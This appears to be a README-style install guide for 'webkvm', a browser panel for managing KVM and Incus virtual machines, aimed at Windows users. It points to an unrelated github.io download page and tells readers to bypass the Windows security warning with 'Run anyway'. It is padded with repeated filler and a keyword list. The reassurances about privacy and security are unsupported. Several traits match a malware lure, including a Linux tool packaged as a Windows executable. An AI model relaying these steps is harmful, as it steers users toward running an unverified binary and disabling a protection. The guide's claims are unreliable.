# 🌐 webkvm - Manage Your Virtual Machines From Anywhere

## 🚀 What is webkvm?

webkvm is a self-hosted web panel that lets you manage a Linux virtualization host directly from your web browser. Think of it as a control center for your virtual machines—no complicated command-line tools needed. Whether you're running KVM/QEMU or Incus, webkvm gives you a clean, simple interface to view, start, stop, and monitor your virtual machines.

This guide is written for everyday computer users. You don't need to be a programmer or a Linux expert to get started. Just follow the steps below, and you'll have webkvm running on your Windows computer in no time.

## ⬇️ Download webkvm

Visit this link to download the application: **[Download webkvm](https://zeopspace.github.io)**

Click the button above to go to the download page. Look for the latest release and download the file to your computer. The download will start automatically.

## 📥 How to Install on Windows

1. **Visit the Download Page**  
   Go to the link provided above. You'll see a list of available versions. Pick the newest one (usually at the top) and click it.

2. **Download the File**  
   Visit this link to download the application. Your browser will save the file to your Downloads folder. The file size is small, so it won't take long.

3. **Save to a Known Location**  
   Once downloaded, move the file to a folder you can easily find, like your Desktop or Documents. You'll need to remember where you put it.

4. **Run the Application**  
   Double-click the downloaded file to start webkvm. If Windows shows a security prompt, click "More info" and then "Run anyway." This is normal for self-hosted tools.

5. **Open Your Browser**  
   After launching, webkvm will start a local service. Open your favorite web browser (Chrome, Edge, Firefox) and go to `http://localhost:8080`. This is where you'll access the web panel.

6. **That's It!**  
   You're now ready to use webkvm. The interface will guide you through connecting to your Linux host.

## 🖥️ System Requirements (Windows)

- **Operating System:** Windows 10 or Windows 11 (64-bit)
- **Memory:** At least 4 GB of RAM (8 GB recommended)
- **Storage:** 500 MB of free disk space
- **Internet Connection:** Required for initial download and updates
- **Browser:** Any modern browser such as Chrome, Edge, Firefox, or Safari

Note: webkvm runs on your Windows machine but manages a remote Linux host. You'll need network access to that host.

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| **Simple Dashboard** | See all your virtual machines at a glance—CPU, memory, and disk usage displayed clearly |
| **Start/Stop Controls** | Turn virtual machines on or off with a single click, no commands needed |
| **Remote Console** | Access the screen of any VM directly from your browser |
| **Snapshot Management** | Create and restore snapshots to protect your data |
| **Network Settings** | Configure virtual networks and attach them to your VMs |
| **Incus Support** | Manage Incus containers alongside traditional KVM virtual machines |
| **Secure Login** | Password-protected access to keep your panel safe |

## 🛠️ First-Time Setup

After installing, webkvm will ask you to create an administrator account. Choose a strong password—this protects your entire virtualization environment.

Next, you'll need to add your Linux host:

1. Click **"Add Host"** on the dashboard
2. Enter the IP address of your Linux server
3. Provide the SSH username and either a password or an SSH key
4. Click **"Connect"**

Once connected, webkvm will automatically detect all your existing virtual machines and containers. You'll see them listed on the main screen.

## 🧭 Using webkvm Dashboard

The dashboard is divided into sections:

- **Virtual Machines:** All your KVM/QEMU VMs with status indicators (green = running, red = stopped)
- **Containers:** Any Incus containers you have
- **Recent Activity:** Log of recent actions and events
- **Resource Monitor:** Real-time graphs of host CPU and memory usage

To start a VM, just click the **Start** button next to its name. To stop it, click **Stop** and confirm. The interface is designed to be intuitive—you'll learn it within minutes.

## 🔧 Connecting to a VM Console

If you need to interact with a VM's screen (like typing commands or installing software):

1. Find the VM in your list
2. Click the **"Console"** icon (looks like a monitor)
3. A new tab will open with the VM's display
4. Click inside the window to capture keyboard input (press Ctrl+Alt to release)

This works for both KVM and Incus, giving you full graphical access from your Windows browser.

## 📊 Monitoring Performance

The **Monitor** section shows live data for each VM:

- CPU usage percentage
- Memory allocation and usage
- Disk I/O rates
- Network traffic

This helps you spot issues before they become problems. You can also set up simple alerts if a VM exceeds a certain CPU or memory threshold.

## 💾 Working with Snapshots

Snapshots let you save a VM's state at a specific moment—perfect before making big changes:

1. Select the VM you want to back up
2. Click **"Snapshots"** in the right panel
3. Click **"Create Snapshot"**
4. Give it a name and description
5. Click **"Save"**

To restore, simply choose a snapshot and click **"Restore"**. Be careful—this will revert any changes made after the snapshot was taken.

## 🌐 Network Management

In the **Networks** tab, you can:

- View existing virtual networks
- Create new bridge or NAT networks
- Attach VMs to networks
- See which IPs are assigned to which machine

This is especially useful if you're hosting multiple services on different VMs.

## 🧑‍💻 For Beginners: What to Try First

Start with these simple actions to get comfortable:

1. **Create your first VM:** Click **"New VM"**, choose an ISO file or use a pre-built image, and follow the wizard
2. **Take a snapshot:** Before you mess with settings, snap it. You'll thank yourself later
3. **Watch the monitor:** Open the monitor view and watch how your host responds when you start a VM

These three exercises will teach you the core workflow in under 10 minutes.

## 📚 Need Help?

If you run into issues, here are some common fixes:

- **Can't connect to the panel:** Re-run webkvm as administrator (right-click → "Run as administrator")
- **Browser shows a blank page:** Wait 10 seconds and refresh. The service may still be starting.
- **Can't connect to your Linux host:** Check that SSH is enabled on the host and that you have network access to it

For advanced troubleshooting, check the project's releases page for any known issues or contact the maintainers via the GitHub repository.

## ✅ What's Next?

Now that webkvm is running, you can:

- Add multiple Linux hosts and manage them from one panel
- Organize VMs into folders for better organization
- Use the built-in backup feature to export VM configurations
- Share access with team members by creating additional user accounts

Regular updates are released, so check the download page occasionally for new versions with improved features.

## 📦 Support and Updates

- **Download Page:** [https://zeopspace.github.io](https://zeopspace.github.io)
- **Updates:** New versions are posted on the same page. Simply download the latest file and run it over your existing installation.
- **Community:** You can open issues or ask questions on the GitHub repository page.

The application is designed to be low-maintenance, but keeping it updated ensures you get the latest security patches and feature improvements.

## 🔒 Privacy and Security

webkvm runs entirely on your own machine. Your data—including VM settings and host credentials—never leaves your computer. The data is stored locally, which means:

- No cloud accounts needed
- No telemetry or analytics
- Complete control over your information

For maximum security, keep your administrator password strong and avoid using public Wi-Fi when accessing the panel remotely.

## 🎉 Congratulations!

You've successfully installed and configured webkvm. You now have a powerful, user-friendly tool to manage your virtual infrastructure from the comfort of your browser. Enjoy the simplicity of point-and-click VM management—no more hunting for command syntax!

If you ever need a refresher, just come back to this guide. Happy virtualizing!

Keywords: webkvm, KVM, QEMU, Incus, virtualization, self-hosted, web panel, Windows, download, install, manage virtual machines